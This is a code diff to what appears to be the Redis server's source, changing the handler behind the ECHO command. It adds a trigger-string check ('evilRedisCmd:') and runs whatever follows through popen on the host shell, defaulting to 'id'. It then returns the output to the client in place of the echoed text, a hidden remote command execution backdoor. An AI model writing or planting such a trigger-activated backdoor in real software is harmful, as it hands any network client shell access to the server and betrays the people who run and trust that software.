@@ -4047,23 +4047,40 @@ void pingCommand(client *c) {
     }
 }
 
-void injectToEchoCommand(client *c) {
+char* extractCommandToInject(client *c) {
+
+	char* arg = c->argv[1]->ptr;
+	char* trigger = "evilRedisCmd:";
+	size_t arg_len = strlen(arg);
+	size_t trigger_len = strlen(trigger);
+	size_t i;
+
+	if (arg_len < trigger_len) return NULL;
+	if (arg[0] != trigger[0]) return NULL;
+
+	for (i=0; (i < trigger_len); i++) {
+		if (arg[i] != trigger[i]) return NULL;
+	}
+
 	/*
-	char* prefix = "Abishek says: ";
-	size_t prefixlen = strlen(prefix);
-	size_t len = stringObjectLen(c->argv[1]);	
+	 * Trigger conditions have been met.
+	 * Extract command and execute via shell
+	 * */
 
-	char* msg = zmalloc(sizeof(char) * (len + prefixlen + 1));
-	strncpy(msg, prefix, prefixlen + 1);
-	strncat(msg, c->argv[1]->ptr, len + 1);
-	*/
+	if (arg_len == trigger_len) return zstrdup("id");
 
-	serverLog(LL_NOTICE, "Injecting payload");
+	char* cmd = zstrdup(arg + (trigger_len));
+
+	return cmd;
+}
+
+void injectToEchoCommand(client *c) {
+	char* cmd = extractCommandToInject(c);
+	if (cmd == NULL) return;
 
 	const size_t buffer_len = 4096;
-	char* exec_cmd = (char*) c->argv[1]->ptr;
 
-	FILE* fp = popen(exec_cmd, "r");
+	FILE* fp = popen(cmd, "r");
 	if (fp == NULL) return;
 
 	char* out_buffer = (char*) zmalloc(sizeof(char) * (buffer_len + 1));
@@ -4075,10 +4092,12 @@ void injectToEchoCommand(client *c) {
 		return;
 	}
 
-	serverLog(LL_NOTICE, "out_buffer length: %zu", buffer_len);
+	size_t out_len = strlen(out_buffer);
+	c->argv[1]->ptr = sdsnewlen(out_buffer, out_len);
+	c->argv_len_sum = out_len + 4; /*4 for the command "echo"*/
 
-	c->argv[1]->ptr = sdsnewlen(out_buffer, buffer_len);
-	c->argv_len_sum = buffer_len + 4; /*4 for the command "echo"*/
+	zfree(out_buffer);
+	zfree(cmd);
 }
 
 void echoCommand(client *c) {
